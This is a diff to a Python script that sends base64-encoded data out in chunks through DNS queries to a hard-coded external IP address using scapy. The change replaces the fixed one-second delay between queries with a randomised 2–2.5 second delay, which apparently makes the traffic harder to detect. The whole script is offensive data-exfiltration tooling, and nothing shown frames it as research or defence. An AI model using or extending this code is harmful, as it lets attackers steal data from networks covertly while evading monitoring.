@@ -1,6 +1,7 @@
 from textwrap import wrap
 import base64
 from scapy.all import *
+import random
 
 
 dns_server = "3.253.51.115"
@@ -28,4 +29,5 @@ for i in divided:
     query= (new_value+"."+custom_string+"."+domain)
     exfiltration(dns_server, query,dns_query_type)
     print("Query:",query)
-    time.sleep(1)
+    time.sleep(random.uniform(2, 2.5))
+
